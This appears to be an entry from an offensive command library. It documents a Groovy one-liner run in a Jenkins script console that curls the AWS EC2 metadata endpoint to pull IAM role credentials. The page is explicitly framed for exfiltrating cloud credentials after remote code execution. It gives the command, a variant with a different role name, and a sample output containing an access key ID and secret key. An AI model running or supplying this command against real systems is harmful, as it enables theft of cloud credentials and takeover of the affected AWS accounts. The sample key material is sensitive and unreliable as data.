---
id: cmd-groovy-curl-aws-001
data: >-
  println "curl
  http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text
tags:
  - rce
  - aws
  - exfiltration
type: command
output: >-
  {"Code": "Success", "LastUpdated": "2023-07-25T15:06:03Z", "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAVAYADSOPOZ46OKUF", "SecretAccessKey":
  "zktjDluq7fiPeRPZ/Ptdj0f/RpifcpiverrHZPY9", "Token": "FwoDYXdzEC4a...",
  "Expiration": "2023-07-25T21:32:22Z"}
executor: groovy
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.276Z'
verified: false
validated: true
submitted: true
---
# groovy-curl-aws-metadata

## Command

```groovy
println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text
```

## Description

Groovy one-liner executed in a Jenkins script console to run a curl command fetching AWS IAM credentials from the EC2 metadata service and print the JSON output. Use in RCE scenarios to exfiltrate cloud credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| endpoint | AWS metadata URL for IAM role (e.g., http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME) | Yes |

## Examples

### Basic Usage

```groovy
println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text
```

### Advanced Usage

Adjust role name:
```groovy
println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyCustomRole".execute().text
```

## Expected Output

JSON object with AWS credentials: {"Code": "Success", "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "...", "Expiration": "..."}.

## Related

- [[Related Procedure|procedures/Access-Jenkins-Console-and-Exfiltrate-AWS-Credentials]]
